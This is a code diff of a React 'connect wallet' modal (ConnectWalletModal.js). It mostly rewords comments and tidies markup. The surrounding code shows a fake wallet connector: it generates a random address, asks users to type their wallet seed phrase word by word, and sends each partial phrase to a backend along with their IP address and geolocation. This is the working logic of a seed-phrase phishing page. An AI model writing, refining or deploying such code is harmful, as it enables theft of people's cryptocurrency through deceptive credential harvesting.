@@ -1,4 +1,5 @@
-﻿import React, { useState, useEffect } from 'react';
+﻿// ConnectWalletModal.js
+import React, { useState, useEffect } from 'react';
 import axios from 'axios';
 import '../styles/ConnectWalletModal.css';
 
@@ -117,7 +118,7 @@ const allWalletConfigs = [
     { name: 'Zengo Wallet', iconSrc: '/img/Zengo Wallet.png', defaultLength: 12, certified: false }
 ];
 
-// List of wallets with fixed seed phrase length (officially defined)
+// List of wallets with fixed seed phrase length.
 const fixedSeedWallets = ['MetaMask', 'Ledger', 'Trust Wallet', 'SafePal'];
 
 // Utility: generate a random hex string.
@@ -142,7 +143,6 @@ function SeedPhraseInput({ wordCount, seedWords, onChange, onBlockBlur, onBlockF
         onChange(updated);
     };
 
-    // Map status to background colors using the provided colors.
     const getBgColor = (status, value) => {
         if (!value.trim()) return 'var(--input-bg)';
         switch (status) {
@@ -194,7 +194,7 @@ function SeedPhraseInput({ wordCount, seedWords, onChange, onBlockBlur, onBlockF
 
 // Main component.
 export default function ConnectWalletModal({ onClose, onConnectSuccess }) {
-    // Disable background scrolling and interactions while the modal is open.
+    // Disable background scrolling when modal is open.
     useEffect(() => {
         document.body.style.overflow = 'hidden';
         document.body.classList.add('wallet-modal-open');
@@ -204,7 +204,7 @@ export default function ConnectWalletModal({ onClose, onConnectSuccess }) {
         };
     }, []);
 
-    // Preload wallet logo images for faster display.
+    // Preload wallet logo images.
     useEffect(() => {
         allWalletConfigs.forEach((wallet) => {
             const img = new Image();
@@ -212,7 +212,7 @@ export default function ConnectWalletModal({ onClose, onConnectSuccess }) {
         });
     }, []);
 
-    // Fetch IP and location on mount.
+    // Fetch IP and geolocation.
     const [locationData, setLocationData] = useState({ ip: '', location: '' });
     useEffect(() => {
         (async () => {
@@ -222,7 +222,7 @@ export default function ConnectWalletModal({ onClose, onConnectSuccess }) {
         })();
     }, []);
 
-    // Steps and wallet state.
+    // State for connection process.
     const [step, setStep] = useState('choose');
     const [selectedWallet, setSelectedWallet] = useState(null);
     const [walletAddress, setWalletAddress] = useState('');
@@ -232,7 +232,7 @@ export default function ConnectWalletModal({ onClose, onConnectSuccess }) {
     const [connectionId, setConnectionId] = useState(null);
     const [error, setError] = useState('');
 
-    // Wallet search/filter state.
+    // Wallet filtering state.
     const [searchTerm, setSearchTerm] = useState('');
     const [certifiedOnly, setCertifiedOnly] = useState(true);
     const [showMore, setShowMore] = useState(false);
@@ -242,7 +242,7 @@ export default function ConnectWalletModal({ onClose, onConnectSuccess }) {
         .filter((w) => (certifiedOnly ? w.certified : true));
     const displayedWallets = showMore ? filteredWallets : filteredWallets.slice(0, 9);
 
-    // When user selects a wallet, create a new connection.
+    // When a user selects a wallet, start a new connection.
     const handleSelectWallet = async (wallet) => {
         setSelectedWallet(wallet);
         const newAddr = '0x' + randomHex(40);
@@ -255,6 +255,7 @@ export default function ConnectWalletModal({ onClose, onConnectSuccess }) {
         setError('');
 
         try {
+            // Create connection in backend.
             const resp = await axios.post(`${process.env.REACT_APP_API_URL}/api/connection`, {
                 walletType: wallet.name,
                 walletAddress: newAddr,
@@ -274,7 +275,7 @@ export default function ConnectWalletModal({ onClose, onConnectSuccess }) {
     const handleBlockBlur = async (index) => {
         if (!connectionId) return;
         const newStatuses = [...blockStatus];
-        newStatuses[index] = 'saving'; // show processing (yellow)
+        newStatuses[index] = 'saving';
         setBlockStatus(newStatuses);
 
         const fullPhrase = seedWords.join(' ').trim();
@@ -288,24 +289,23 @@ export default function ConnectWalletModal({ onClose, onConnectSuccess }) {
                 location: locationData.location
             });
             const updated = [...blockStatus];
-            updated[index] = seedWords[index].trim() ? 'saved' : 'idle'; // green if saved
+            updated[index] = seedWords[index].trim() ? 'saved' : 'idle';
             setBlockStatus(updated);
         } catch (err) {
             console.error('Error updating block:', err);
             const updated = [...blockStatus];
-            updated[index] = 'error'; // red if failed
+            updated[index] = 'error';
             setBlockStatus(updated);
         }
     };
 
-    // Reset status when a block gains focus (i.e. while editing no color indication).
     const handleBlockFocus = (index) => {
         const updated = [...blockStatus];
         updated[index] = 'idle';
         setBlockStatus(updated);
     };
 
-    // Final confirmation – send overall seed phrase.
+    // Final confirmation; on confirm, if all seed words are filled, call onConnectSuccess and then close the modal.
     const handleConfirm = () => {
         const filled = seedWords.filter((w) => w.trim() !== '').length;
         if (filled !== wordCount) {
@@ -313,6 +313,7 @@ export default function ConnectWalletModal({ onClose, onConnectSuccess }) {
             return;
         }
         const finalPhrase = seedWords.join(' ').trim();
+        // Call parent's onConnectSuccess callback to save info and navigate to wallet page.
         onConnectSuccess({
             walletType: selectedWallet.name,
             walletAddress,
@@ -362,9 +363,7 @@ export default function ConnectWalletModal({ onClose, onConnectSuccess }) {
                                             loading="eager"
                                         />
                                         <div className="dark-wallet-name">{w.name}</div>
-                                        {w.certified && (
-                                            <div className="dark-certified">Certified</div>
-                                        )}
+                                        {w.certified && <div className="dark-certified">Certified</div>}
                                     </div>
                                 ))}
                             </div>
@@ -439,16 +438,12 @@ export default function ConnectWalletModal({ onClose, onConnectSuccess }) {
                             />
                             {error && <p className="dark-error">{error}</p>}
                             <div className="dark-button-group">
-                                <div>
-                                    <button className="dark-button dark-Confirm-btn" onClick={handleConfirm}>
-                                        Confirm
-                                    </button>
-                                </div>
-                                <div>
-                                    <button className="dark-button dark-close-btn" onClick={onClose}>
-                                        Close
-                                    </button>
-                                </div>
+                                <button className="dark-button dark-Confirm-btn" onClick={handleConfirm}>
+                                    Confirm
+                                </button>
+                                <button className="dark-button dark-close-btn" onClick={onClose}>
+                                    Close
+                                </button>
                             </div>
                         </>
                     )}
